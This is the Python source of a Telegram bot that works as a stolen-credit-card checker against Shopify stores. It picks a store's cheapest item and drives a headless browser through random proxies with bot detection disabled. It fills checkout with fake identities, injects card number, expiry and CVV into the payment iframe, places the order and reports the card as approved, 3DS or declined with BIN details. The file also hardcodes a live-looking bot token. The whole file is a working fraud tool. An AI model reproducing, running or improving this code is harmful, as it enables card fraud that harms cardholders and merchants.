import json
import logging
import time
import random
from pathlib import Path
from telegram.ext import Updater, CommandHandler, ConversationHandler
from playwright.sync_api import sync_playwright, TimeoutError
from faker import Faker
import requests

TELEGRAM_TOKEN = '8352839091:AAFqMZgK2AsX4qLKsWKT2DJ9XSc7E1oL-4c'
USER_DATA_FILE = "user_data.json"
PROXY_FILE = "proxy.txt"
fake = Faker("en_US")

WAIT_SITE, WAIT_CHECK = range(2)

def load_user_data():
    if Path(USER_DATA_FILE).exists():
        try:
            with open(USER_DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

user_data = load_user_data()

def load_proxies(filename=PROXY_FILE):
    try:
        with open(filename) as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except Exception:
        return []

def get_random_proxy(proxies):
    if not proxies:
        return None
    return random.choice(proxies)

def generate_fresh_fake_data():
    """Generate fresh fake data for each transaction"""
    return {
        "name": fake.name(),
        "email": fake.email(),
        "address": fake.street_address(),
        "city": fake.city(),
        "zip": fake.zipcode(),
        "country": "United States",
        "phone": fake.phone_number().replace('(', '').replace(')', '').replace('-', '').replace(' ', '')[:10]
    }

def start(update, context):
    update.message.reply_text(
        "Send /setsite <shopify-url> to begin (e.g. /setsite https://nexbelt.com)\n"
        "After setting your site, use /check <card|mm|yyyy|cvc>.\n"
        "You can use /reset at any time to remove your site."
    )
    return WAIT_SITE

def setsite(update, context):
    chat_id = update.effective_chat.id
    user = update.effective_user.first_name or f"User_{chat_id}"
    if len(context.args) != 1 or not context.args[0].startswith("http"):
        update.message.reply_text("❗ Usage: /setsite <shopify-url>")
        return WAIT_SITE
    site = context.args[0].strip().rstrip("/")
    msg, product = find_cheapest_product_fast(site)
    if not product:
        update.message.reply_text(f"❌ {msg}")
        return WAIT_SITE
    user_data[str(chat_id)] = {
        "site": site,
        "cheapest_product": product,
        "user": user
    }
    save_user_data(user_data)
    update.message.reply_text(
        f"✅ Site added!\nCheapest product: {product['title']} – ${product['price']}\n"
        f"Send /check <card|mm|yyyy|cvc> to test a card!\n"
        f"Or /reset to remove your site."
    )
    return WAIT_CHECK

def check(update, context):
    chat_id = update.effective_chat.id
    user = update.effective_user.first_name or f"User_{chat_id}"
    udata = user_data.get(str(chat_id))
    if not udata:
        update.message.reply_text("❗ Please /setsite first.")
        return WAIT_SITE
    if len(context.args) != 1 or "|" not in context.args[0]:
        update.message.reply_text("Usage: /check <card|mm|yyyy|cvc>")
        return WAIT_CHECK
    try:
        cc, mm, yyyy, cvc = context.args[0].strip().split("|")
        start_t = time.time()
        fresh_fake_data = generate_fresh_fake_data()
        status, response, total = run_shopify_payment_checkout(
            udata['site'], udata['cheapest_product'], fresh_fake_data, cc, mm, yyyy, cvc
        )
        end_t = time.time()
        msg = build_reply(
            card=f"{cc}|{mm}|{yyyy}|{cvc}",
            price=str(total),
            status=status,
            response=response,
            t_taken=(end_t-start_t),
            user=user
        )
        update.message.reply_text(msg, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        update.message.reply_text(f"❌ Error: {e}")
    return WAIT_CHECK

def reset(update, context):
    chat_id = str(update.effective_chat.id)
    if chat_id in user_data:
        user_data.pop(chat_id)
        save_user_data(user_data)
        update.message.reply_text("✅ Your site and info have been reset. Use /setsite to start again.")
    else:
        update.message.reply_text("No site to reset. Use /setsite to add one.")
    return WAIT_SITE

def find_cheapest_product_fast(shop_url):
    """Ultra-fast product finder"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        }
        
        endpoint = f"{shop_url}/products.json?limit=25"
        r = requests.get(endpoint, timeout=8, headers=headers)
        
        if r.status_code != 200:
            return f"Failed to fetch products (Status: {r.status_code})", None
        
        data = r.json()
        products = data.get("products", [])
        if not products:
            return "No products found", None
        
        cheapest = None
        for prod in products[:12]:
            if not prod.get("variants"):
                continue
                
            for variant in prod.get("variants", [])[:2]:
                if not variant.get("available", True):
                    continue
                    
                try:
                    price = float(variant.get("price", "999999"))
                except (ValueError, TypeError):
                    continue
                    
                if not cheapest or price < cheapest["price"]:
                    cheapest = {
                        "handle": prod["handle"],
                        "variant_id": variant["id"],
                        "price": price,
                        "title": prod["title"]
                    }
        
        if not cheapest:
            return "No available products found", None
        
        return "OK", cheapest
        
    except Exception as e:
        return f"Error: {str(e)[:50]}", None

def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
    """Enhanced Shopify checkout with specialized payment iframe handling"""
    proxies = load_proxies()
    proxy_str = get_random_proxy(proxies)
    proxy_arg = {}
    
    if proxy_str:
        try:
            if "@" in proxy_str:
                auth, ip_port = proxy_str.split("@")
                user, pwd = auth.split(":")
                ip, port = ip_port.split(":")
                proxy_arg = {
                    "server": f"http://{ip}:{port}",
                    "username": user,
                    "password": pwd
                }
            else:
                ip, port = proxy_str.split(":")
                proxy_arg = {"server": f"http://{ip}:{port}"}
        except:
            proxy_arg = {}
    
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=[
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-background-timer-throttling',
                    '--disable-extensions',
                    '--disable-plugins'
                ]
            )
            
            context_options = {
                'viewport': {'width': 1280, 'height': 720},
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'locale': 'en-US'
            }
            
            if proxy_arg:
                context_options['proxy'] = proxy_arg
            
            context = browser.new_context(**context_options)
            page = context.new_page()
            
            page.set_default_timeout(12000)
            page.set_default_navigation_timeout(15000)
            
            try:
                # Add to cart
                print("Adding to cart...")
                page.goto(f"{site}/cart/add?id={product['variant_id']}&quantity=1", 
                         timeout=12000, wait_until='domcontentloaded')
                time.sleep(0.5)
                
                # Go to checkout
                print("Going to checkout...")
                page.goto(f"{site}/checkout", timeout=12000, wait_until='domcontentloaded')
                time.sleep(0.8)
                
                # Fill email with multiple strategies
                print("Filling email...")
                email_filled = False
                
                # Strategy 1: Standard selectors
                email_selectors = [
                    'input[name="checkout[email]"]',
                    'input[type="email"]',
                    '#checkout_email',
                    'input[placeholder*="email" i]',
                    'input[autocomplete="email"]',
                    'input[name="email"]'
                ]
                
                for selector in email_selectors:
                    try:
                        if page.query_selector(selector):
                            page.fill(selector, shipping['email'], timeout=3000)
                            email_filled = True
                            break
                    except:
                        continue
                
                # Strategy 2: JavaScript injection
                if not email_filled:
                    try:
                        page.evaluate(f"""
                            const emailInputs = document.querySelectorAll('input');
                            for (let input of emailInputs) {{
                                if (input.type === 'email' || 
                                    input.name.toLowerCase().includes('email') || 
                                    input.placeholder && input.placeholder.toLowerCase().includes('email')) {{
                                    input.focus();
                                    input.value = '{shipping['email']}';
                                    input.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                    input.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                    input.blur();
                                    break;
                                }}
                            }}
                        """)
                        email_filled = True
                    except:
                        pass
                
                if not email_filled:
                    browser.close()
                    return "DECLINED", "Email field detection failed", product["price"]
                
                # Fill shipping information
                print("Filling shipping info...")
                name_parts = shipping['name'].split()
                first_name = name_parts[0] if name_parts else "John"
                last_name = name_parts[-1] if len(name_parts) > 1 else "Doe"
                
                shipping_data = [
                    (['input[name="checkout[shipping_address][first_name]"]', '#checkout_shipping_address_first_name'], first_name),
                    (['input[name="checkout[shipping_address][last_name]"]', '#checkout_shipping_address_last_name'], last_name),
                    (['input[name="checkout[shipping_address][address1]"]', '#checkout_shipping_address_address1'], shipping['address']),
                    (['input[name="checkout[shipping_address][city]"]', '#checkout_shipping_address_city'], shipping['city']),
                    (['input[name="checkout[shipping_address][zip]"]', '#checkout_shipping_address_zip'], shipping['zip']),
                    (['input[name="checkout[shipping_address][phone]"]', '#checkout_shipping_address_phone'], shipping['phone'])
                ]
                
                for selectors, value in shipping_data:
                    for selector in selectors:
                        try:
                            if page.query_selector(selector):
                                page.fill(selector, value, timeout=2000)
                                break
                        except:
                            continue
                
                # Handle country
                try:
                    page.select_option('select[name="checkout[shipping_address][country]"]', 'United States', timeout=2000)
                except:
                    pass
                
                # Continue to shipping
                print("Continuing to shipping...")
                continue_buttons = [
                    'button[type="submit"]',
                    'button:has-text("Continue")',
                    '.btn-continue'
                ]
                
                for btn_selector in continue_buttons:
                    try:
                        if page.query_selector(btn_selector):
                            page.click(btn_selector, timeout=3000)
                            break
                    except:
                        continue
                
                time.sleep(1.2)
                
                # Continue to payment
                print("Continuing to payment...")
                for btn_selector in continue_buttons:
                    try:
                        if page.query_selector(btn_selector):
                            page.click(btn_selector, timeout=3000)
                            break
                    except:
                        continue
                
                time.sleep(1.5)
                
                # Get total price
                total_price = product["price"]
                try:
                    total_text = page.inner_text('.payment-due__price', timeout=2000)
                    total_price = float(total_text.replace("$", "").replace(",", "").strip())
                except:
                    pass
                
                # Enhanced payment iframe handling
                print("Handling payment iframe...")
                
                # Wait for iframe to load
                iframe_loaded = False
                iframe_selectors = [
                    'iframe[src*="card-fields"]',
                    'iframe[name*="card"]',
                    'iframe[src*="checkout"]'
                ]
                
                for iframe_selector in iframe_selectors:
                    try:
                        page.wait_for_selector(iframe_selector, timeout=8000)
                        iframe_loaded = True
                        break
                    except:
                        continue
                
                if not iframe_loaded:
                    browser.close()
                    return "DECLINED", "Payment iframe not loaded", total_price
                
                # Advanced card field filling with multiple strategies
                print("Filling card fields...")
                card_filled = 0
                
                # Strategy 1: Direct iframe field access
                for frame in page.frames:
                    frame_url = frame.url.lower()
                    if not frame_url or ("card" not in frame_url and "checkout" not in frame_url):
                        continue
                    
                    try:
                        # Card number
                        number_selectors = [
                            'input[name="number"]',
                            'input[placeholder*="card" i]',
                            'input[autocomplete="cc-number"]',
                            'input[data-testid="card-number"]',
                            '#card-number',
                            'input[aria-label*="card" i]'
                        ]
                        
                        for selector in number_selectors:
                            try:
                                if frame.query_selector(selector):
                                    frame.fill(selector, cc, timeout=3000)
                                    card_filled += 1
                                    print(f"Card number filled with: {selector}")
                                    break
                            except:
                                continue
                        
                        # Expiry date
                        expiry_selectors = [
                            'input[name="expiry"]',
                            'input[placeholder*="mm/yy" i]',
                            'input[placeholder*="expiry" i]',
                            'input[autocomplete="cc-exp"]',
                            'input[data-testid="expiry"]',
                            '#card-expiry'
                        ]
                        
                        expiry_value = f"{mm}/{yyyy[-2:]}"
                        for selector in expiry_selectors:
                            try:
                                if frame.query_selector(selector):
                                    frame.fill(selector, expiry_value, timeout=3000)
                                    card_filled += 1
                                    print(f"Expiry filled with: {selector}")
                                    break
                            except:
                                continue
                        
                        # CVV
                        cvv_selectors = [
                            'input[name="verification_value"]',
                            'input[placeholder*="cvv" i]',
                            'input[placeholder*="cvc" i]',
                            'input[autocomplete="cc-csc"]',
                            'input[data-testid="cvv"]',
                            '#card-cvc'
                        ]
                        
                        for selector in cvv_selectors:
                            try:
                                if frame.query_selector(selector):
                                    frame.fill(selector, cvc, timeout=3000)
                                    card_filled += 1
                                    print(f"CVV filled with: {selector}")
                                    break
                            except:
                                continue
                        
                        if card_filled >= 3:
                            break
                            
                    except Exception as e:
                        print(f"Frame error: {e}")
                        continue
                
                # Strategy 2: JavaScript injection in iframe
                if card_filled < 3:
                    print("Trying JavaScript injection for card fields...")
                    for frame in page.frames:
                        frame_url = frame.url.lower()
                        if not frame_url or ("card" not in frame_url and "checkout" not in frame_url):
                            continue
                        
                        try:
                            # Inject card data via JavaScript
                            frame.evaluate(f"""
                                const inputs = document.querySelectorAll('input');
                                let filled = 0;
                                
                                for (let input of inputs) {{
                                    // Card number
                                    if ((input.name && input.name.includes('number')) || 
                                        (input.placeholder && input.placeholder.toLowerCase().includes('card'))) {{
                                        input.focus();
                                        input.value = '{cc}';
                                        input.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                        input.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                        input.blur();
                                        filled++;
                                    }}
                                    // Expiry
                                    else if ((input.name && input.name.includes('expiry')) || 
                                             (input.placeholder && (input.placeholder.toLowerCase().includes('mm/yy') || 
                                                                   input.placeholder.toLowerCase().includes('expiry')))) {{
                                        input.focus();
                                        input.value = '{mm}/{yyyy[-2:]}';
                                        input.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                        input.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                        input.blur();
                                        filled++;
                                    }}
                                    // CVV
                                    else if ((input.name && (input.name.includes('verification') || input.name.includes('cvv'))) || 
                                             (input.placeholder && (input.placeholder.toLowerCase().includes('cvv') || 
                                                                   input.placeholder.toLowerCase().includes('cvc')))) {{
                                        input.focus();
                                        input.value = '{cvc}';
                                        input.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                        input.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                        input.blur();
                                        filled++;
                                    }}
                                }}
                                
                                return filled;
                            """)
                            card_filled = 3  # Assume success if no error
                            break
                        except Exception as e:
                            print(f"JavaScript injection error: {e}")
                            continue
                
                if card_filled < 3:
                    browser.close()
                    return "DECLINED", f"Card fields incomplete ({card_filled}/3) - iframe access blocked", total_price
                
                # Submit payment
                print("Submitting payment...")
                payment_buttons = [
                    'button[type="submit"]',
                    'button:has-text("Complete")',
                    'button:has-text("Pay")',
                    'button:has-text("Place")',
                    '.btn-checkout'
                ]
                
                payment_submitted = False
                for btn_selector in payment_buttons:
                    try:
                        if page.query_selector(btn_selector):
                            page.click(btn_selector, timeout=3000)
                            payment_submitted = True
                            break
                    except:
                        continue
                
                if not payment_submitted:
                    # JavaScript fallback
                    try:
                        page.evaluate("""
                            const buttons = document.querySelectorAll('button, input[type="submit"]');
                            for (let btn of buttons) {
                                if (btn.textContent.toLowerCase().includes('complete') || 
                                    btn.textContent.toLowerCase().includes('pay') ||
                                    btn.type === 'submit') {
                                    btn.click();
                                    break;
                                }
                            }
                        """)
                        payment_submitted = True
                    except:
                        pass
                
                if not payment_submitted:
                    browser.close()
                    return "DECLINED", "Payment submission failed", total_price
                
                # Wait for result
                print("Waiting for result...")
                time.sleep(4)
                
                url = page.url.lower()
                content = page.content().lower()
                browser.close()
                
                # Result detection
                if any(keyword in url for keyword in ["thank_you", "success", "confirmation"]):
                    return "APPROVED", "PAYMENT_SUCCESS", total_price
                elif any(keyword in content for keyword in ["3d_secure", "authentication", "verify"]):
                    return "3D", "3DS_REQUIRED", total_price
                elif any(keyword in content for keyword in ["declined", "failed", "insufficient"]):
                    return "DECLINED", "CARD_DECLINED", total_price
                else:
                    return "DECLINED", "UNKNOWN_RESULT", total_price
                    
            except TimeoutError:
                browser.close()
                return "DECLINED", "Timeout - site too slow", product["price"]
            except Exception as e:
                browser.close()
                return "DECLINED", f"Error: {str(e)[:50]}", product["price"]
                
    except Exception as e:
        return "DECLINED", f"Browser error: {str(e)[:50]}", product["price"]

def bin_lookup(bin_number):
    """Fast BIN lookup"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
        }
        r = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=3, headers=headers)
        if r.status_code == 200:
            d = r.json()
            brand = d.get("scheme", "UNKNOWN").upper()
            card_type = d.get("type", "UNKNOWN").upper()
            level = d.get("brand", "UNKNOWN").upper()
            bank = d.get("bank", {}).get("name", "UNKNOWN")
            country = d.get("country", {}).get("name", "UNKNOWN")
            emoji = d.get("country", {}).get("emoji", "🏳️")
            return brand, card_type, level, bank, country, emoji
    except Exception:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "🏳️"

def build_reply(card, price, status, response, t_taken, user, dev="bunny"):
    n, mm, yy, cvc = card.split("|")
    bin6 = n[:6]
    brand, card_type, level, bank, country, emoji = bin_lookup(bin6)
    if status == "APPROVED":
        stat_emoji = "✅"
        stat_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
    elif status == "3D":
        stat_emoji = "🟡"
        stat_text = "𝐂𝐡𝐞𝐜𝐤 𝟑𝐃/𝐎𝐓𝐏"
    else:
        stat_emoji = "❌"
        stat_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
    return f"""┏━━━ 🔍 Shopify Charge ━━━┓
┃ [ﾒ] Card- <code>{card}</code>
┃ [ﾒ] Gateway- Shopify Normal|{price}$ 
┃ [ﾒ] Status- {stat_text} {stat_emoji}
┃ [ﾒ] Response- {response}
━━═━━═━━═━━═━━
┃ [ﾒ] Bin: {bin6}
┃ [ﾒ] Info- {brand} - {card_type} - {level} 💳
┃ [ﾒ] Bank- {bank} 🏦
┃ [ﾒ] Country- {country} - [{emoji}]
━━═━━═━━═━━═━━
┃ [ﾒ] T/t- {t_taken:.2f} s 💨
┃ [ﾒ] Checked By: {user}
━━═━━═━━═━━═━━
┃ [ㇺ] Dev ➺ {dev} 
┗━━━ 𝗕𝗨𝗡𝗡𝗬 ━━━┛
"""

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    updater = Updater(TELEGRAM_TOKEN, use_context=True)
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start),
            CommandHandler('setsite', setsite),
            CommandHandler('reset', reset)
        ],
        states={
            WAIT_SITE: [
                CommandHandler('setsite', setsite),
                CommandHandler('reset', reset)
            ],
            WAIT_CHECK: [
                CommandHandler('check', check),
                CommandHandler('setsite', setsite),
                CommandHandler('reset', reset)
            ],
        },
        fallbacks=[
            CommandHandler('cancel', reset),
            CommandHandler('start', start),
            CommandHandler('setsite', setsite),
            CommandHandler('reset', reset)
        ],
        allow_reentry=True
    )
    updater.dispatcher.add_handler(conv_handler)
    updater.start_polling()
    updater.idle()
